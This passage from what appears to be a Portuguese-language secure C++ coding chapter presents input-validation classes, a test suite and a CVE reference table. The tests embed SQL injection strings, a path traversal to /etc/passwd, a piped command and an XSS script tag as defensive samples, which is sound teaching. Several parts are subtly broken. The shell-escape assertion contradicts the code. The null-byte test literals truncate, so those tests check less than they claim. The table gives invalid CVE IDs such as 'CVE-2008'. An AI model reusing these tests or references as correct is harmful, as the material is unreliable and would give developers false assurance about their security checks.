    std::string error_message() const override {
        return "String contains potential SQL injection patterns";
    }

    std::string name() const override {
        return "SQLSafeString";
    }
};

// ============================================================
// Numeric Range Validator
// ============================================================
class NumericRangeValidator : public Validator {
public:
    NumericRangeValidator(int min_val, int max_val)
        : min_val_(min_val)
        , max_val_(max_val) {}

    bool validate(const std::string& input) const override {
        if (input.empty()) {
            return false;
        }

        int value;
        auto [ptr, ec] = std::from_chars(
            input.data(), input.data() + input.size(), value);

        if (ec != std::errc() || ptr != input.data() + input.size()) {
            return false;
        }

        return value >= min_val_ && value <= max_val_;
    }

    std::string error_message() const override {
        return "Value must be between " + std::to_string(min_val_) +
               " and " + std::to_string(max_val_);
    }

    std::string name() const override {
        return "NumericRangeValidator";
    }

private:
    int min_val_;
    int max_val_;
};

// ============================================================
// Length Validator
// ============================================================
class LengthValidator : public Validator {
public:
    LengthValidator(size_t min_len, size_t max_len)
        : min_len_(min_len)
        , max_len_(max_len) {}

    bool validate(const std::string& input) const override {
        return input.length() >= min_len_ && input.length() <= max_len_;
    }

    std::string error_message() const override {
        return "Length must be between " + std::to_string(min_len_) +
               " and " + std::to_string(max_len_) + " characters";
    }

    std::string name() const override {
        return "LengthValidator";
    }

private:
    size_t min_len_;
    size_t max_len_;
};

// ============================================================
// Regex Validator
// ============================================================
class RegexValidator : public Validator {
public:
    RegexValidator(std::string pattern, std::string error_msg = "")
        : pattern_(std::move(pattern))
        , error_msg_(error_msg.empty() ?
                     "Input does not match required pattern" :
                     std::move(error_msg))
        , regex_(pattern_) {}

    bool validate(const std::string& input) const override {
        return std::regex_match(input, regex_);
    }

    std::string error_message() const override {
        return error_msg_;
    }

    std::string name() const override {
        return "RegexValidator";
    }

private:
    std::string pattern_;
    std::string error_msg_;
    std::regex regex_;
};

// ============================================================
// Input Sanitizer
// ============================================================
class InputSanitizer {
public:
    // Remove null bytes
    static std::string remove_null_bytes(const std::string& input) {
        std::string result;
        result.reserve(input.size());
        std::copy_if(input.begin(), input.end(),
                    std::back_inserter(result),
                    [](char c) { return c != '\0'; });
        return result;
    }

    // Remove control characters
    static std::string remove_control_chars(const std::string& input) {
        std::string result;
        result.reserve(input.size());
        for (unsigned char c : input) {
            if (c >= 32 || c == '\n' || c == '\t' || c == '\r') {
                result += static_cast<char>(c);
            }
        }
        return result;
    }

    // Trim whitespace
    static std::string trim(const std::string& input) {
        auto start = input.find_first_not_of(" \t\n\r");
        if (start == std::string::npos) {
            return "";
        }
        auto end = input.find_last_not_of(" \t\n\r");
        return input.substr(start, end - start + 1);
    }

    // Normalize Unicode (basic ASCII normalization)
    static std::string normalize_unicode(const std::string& input) {
        // Simplified: just pass through
        // In production, use ICU library for proper normalization
        return input;
    }

    // HTML encode
    static std::string html_encode(const std::string& input) {
        std::string result;
        result.reserve(input.size() * 2);
        for (char c : input) {
            switch (c) {
                case '&':  result += "&amp;"; break;
                case '<':  result += "&lt;"; break;
                case '>':  result += "&gt;"; break;
                case '"':  result += "&quot;"; break;
                case '\'': result += "&#x27;"; break;
                default:   result += c; break;
            }
        }
        return result;
    }

    // URL encode
    static std::string url_encode(const std::string& input) {
        std::ostringstream result;
        result << std::hex;
        for (unsigned char c : input) {
            if (std::isalnum(c) || c == '-' || c == '_' ||
                c == '.' || c == '~') {
                result << static_cast<char>(c);
            } else {
                result << '%' << std::setw(2) << std::setfill('0')
                       << static_cast<int>(c);
            }
        }
        return result.str();
    }

    // Sanitize for shell (escape special characters)
    static std::string shell_escape(const std::string& input) {
        std::string result;
        result.reserve(input.size() * 2);
        for (char c : input) {
            switch (c) {
                case '\'':  result += "'\\''"; break;
                case '"':   result += "\\\""; break;
                case '\\':  result += "\\\\"; break;
                case '`':   result += "\\`"; break;
                case '$':   result += "\\$"; break;
                case '!':   result += "\\!"; break;
                case '\n':  result += "\\n"; break;
                case '\r':  result += "\\r"; break;
                default:    result += c; break;
            }
        }
        return result;
    }
};

// ============================================================
// Complete Input Validation Framework
// ============================================================
class InputValidator {
public:
    // Validate email
    static ValidationResult validate_email(const std::string& email) {
        ValidatorChain chain;
        chain.add(std::make_shared<LengthValidator>(3, 254))
             .add(std::make_shared<EmailValidator>());

        auto result = chain.validate(InputSanitizer::trim(email));
        result.sanitized_input = InputSanitizer::trim(email);
        return result;
    }

    // Validate file path
    static ValidationResult validate_path(const std::string& path,
                                          const std::string& base_dir) {
        ValidatorChain chain;
        chain.add(std::make_shared<LengthValidator>(1, 4096))
             .add(std::make_shared<PathValidator>(base_dir));

        auto result = chain.validate(path);
        result.sanitized_input = InputSanitizer::trim(path);
        return result;
    }

    // Validate username
    static ValidationResult validate_username(const std::string& username) {
        ValidatorChain chain;
        chain.add(std::make_shared<LengthValidator>(3, 32))
             .add(std::make_shared<RegexValidator>(
                 R"(^[a-zA-Z0-9_]+$)",
                 "Username can only contain letters, numbers, and underscores"));

        auto result = chain.validate(InputSanitizer::trim(username));
        result.sanitized_input = InputSanitizer::trim(username);
        return result;
    }

    // Validate SQL-safe string
    static ValidationResult validate_sql_safe(const std::string& input) {
        ValidatorChain chain;
        chain.add(std::make_shared<LengthValidator>(0, 10000))
             .add(std::make_shared<SQLSafeString>());

        auto result = chain.validate(input);
        result.sanitized_input = InputSanitizer::html_encode(input);
        return result;
    }

    // Validate integer in range
    static ValidationResult validate_integer(const std::string& input,
                                            int min_val = std::numeric_limits<int>::min(),
                                            int max_val = std::numeric_limits<int>::max()) {
        ValidatorChain chain;
        chain.add(std::make_shared<LengthValidator>(1, 11))
             .add(std::make_shared<NumericRangeValidator>(min_val, max_val));

        auto result = chain.validate(InputSanitizer::trim(input));
        result.sanitized_input = InputSanitizer::trim(input);
        return result;
    }

    // Custom validation with lambda
    static ValidationResult validate_custom(
        const std::string& input,
        std::function<bool(const std::string&)> predicate,
        const std::string& error_msg)
    {
        ValidationResult result;
        result.valid = predicate(input);
        result.sanitized_input = input;

        if (!result.valid) {
            result.errors.push_back(error_msg);
        }

        return result;
    }
};

}  // namespace input_validation
```

### 10.3 Suite de Testes

```cpp
#include <cassert>
#include <iostream>
#include <string>

void test_email_validation() {
    using namespace input_validation;

    // Valid emails
    assert(InputValidator::validate_email("user@example.com").valid);
    assert(InputValidator::validate_email("test.user+tag@domain.co.uk").valid);
    assert(InputValidator::validate_email("a@b.cc").valid);

    // Invalid emails
    assert(!InputValidator::validate_email("").valid);
    assert(!InputValidator::validate_email("user@").valid);
    assert(!InputValidator::validate_email("@domain.com").valid);
    assert(!InputValidator::validate_email("user@domain").valid);
    assert(!InputValidator::validate_email("user domain@example.com").valid);

    std::cout << "Email validation tests passed!" << std::endl;
}

void test_path_validation() {
    using namespace input_validation;

    std::string base = "/var/www/uploads";

    // Valid paths
    assert(InputValidator::validate_path("file.txt", base).valid);
    assert(InputValidator::validate_path("dir/file.txt", base).valid);

    // Invalid paths
    assert(!InputValidator::validate_path("../etc/passwd", base).valid);
    assert(!InputValidator::validate_path("file\0.txt", base).valid);
    assert(!InputValidator::validate_path("file|cmd", base).valid);

    std::cout << "Path validation tests passed!" << std::endl;
}

void test_sql_injection_prevention() {
    using namespace input_validation;

    // Safe strings
    assert(InputValidator::validate_sql_safe("John Doe").valid);
    assert(InputValidator::validate_sql_safe("Product #123").valid);

    // SQL injection attempts
    assert(!InputValidator::validate_sql_safe("'; DROP TABLE users; --").valid);
    assert(!InputValidator::validate_sql_safe("1' OR '1'='1").valid);
    assert(!InputValidator::validate_sql_safe("admin'--").valid);

    std::cout << "SQL injection prevention tests passed!" << std::endl;
}

void test_numeric_validation() {
    using namespace input_validation;

    // Valid integers
    assert(InputValidator::validate_integer("42", 0, 100).valid);
    assert(InputValidator::validate_integer("0", 0, 100).valid);
    assert(InputValidator::validate_integer("100", 0, 100).valid);

    // Invalid integers
    assert(!InputValidator::validate_integer("", 0, 100).valid);
    assert(!InputValidator::validate_integer("abc", 0, 100).valid);
    assert(!InputValidator::validate_integer("101", 0, 100).valid);
    assert(!InputValidator::validate_integer("-1", 0, 100).valid);

    std::cout << "Numeric validation tests passed!" << std::endl;
}

void test_sanitization() {
    using namespace input_validation;

    // HTML encoding
    assert(InputSanitizer::html_encode("<script>alert('xss')</script>") ==
           "&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;");

    // URL encoding
    assert(InputSanitizer::url_encode("hello world") == "hello%20world");

    // Shell escaping
    assert(InputSanitizer::shell_escape("test'file") == "test\\'file");

    // Trim
    assert(InputSanitizer::trim("  hello  ") == "hello");

    // Remove null bytes
    assert(InputSanitizer::remove_null_bytes("te\0st") == "test");

    std::cout << "Sanitization tests passed!" << std::endl;
}

void run_all_tests() {
    test_email_validation();
    test_path_validation();
    test_sql_injection_prevention();
    test_numeric_validation();
    test_sanitization();

    std::cout << "\nAll validation tests passed successfully!" << std::endl;
}
```

---

## 11. Referências

### 11.1 CVEs e Vulnerabilidades Documentadas

| CVE | Vulnerabilidade | CWE | Impacto |
|-----|----------------|-----|---------|
| CVE-2008 | Heartland Payment Systems SQL Injection | CWE-89 | 130M cartões comprometidos |
| CVE-2005 | Samy Worm MySpace XSS | CWE-79 | 1M amigos em 20 horas |
| CVE-2014-6271 | Shellshock Bash | CWE-78 | Execução remota em milhões de servidores |
| CVE-2016-3714 | ImageTragick | CWE-78 | RCE via upload de imagem |
| CVE-2021-44228 | Log4Shell | CWE-917 | RCE em milhões de aplicações |
| CVE-2019-14232 | Django Path Traversal | CWE-22 | Leitura arbitrária de arquivos |
| CVE-2020-28469 | Go ReDoS | CWE-1333 | Negation of Service |

### 11.2 Padrões e Especificações

- **CWE-89**: SQL Injection — https://cwe.mitre.org/data/definitions/89.html
- **CWE-79**: Cross-site Scripting — https://cwe.mitre.org/data/definitions/79.html
- **CWE-78**: OS Command Injection — https://cwe.mitre.org/data/definitions/78.html
- **CWE-22**: Path Traversal — https://cwe.mitre.org/data/definitions/22.html
- **CWE-1333**: ReDoS — https://cwe.mitre.org/data/definitions/1333.html
- **OWASP Top 10** — https://owasp.org/www-project-top-ten/
- **OWASP Input Validation Cheat Sheet** — https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html

### 11.3 Bibliotecas Recomendadas

- **RE2** (Google): Expressões regulares seguras — https://github.com/google/re2
- **nlohmann/json**: JSON parsing seguro em C++ — https://github.com/nlohmann/json
- **SQLite3**: Database com parameterized queries — https://www.sqlite.org/
- **fmt**: Formatação segura de strings — https://github.com/fmtlib/fmt
- **ICU**: Processamento Unicode — https://icu.unicode.org/

### 11.4 Leituras Adicionais

- "Secure Coding in C and C++" by Robert C. Seacord
- "The Tangled Web" by Michal Zalewski
- "Exploiting Software" by Greg Hoglund and Gary McGraw
- OWASP ASVS (Application Security Verification Standard)
- SEI CERT C Coding Standard — Secure Coding

---

> *"Validação de entrada não é opcional — é a fundação da segurança do software."*

Este capítulo estabeleceu os fundamentos para construir sistemas seguros em C++17. No próximo capítulo, exploraremos autenticação e autorização, construindo sobre os conceitos de validação aprendidos aqui.
---

*[Capítulo anterior: 05 — Tratamento De Erros E Excecoes](05-tratamento-de-erros-e-excecoes.md)*
*[Próximo capítulo: 07 — Autenticacao E Autorizacao](07-autenticacao-e-autorizacao.md)*
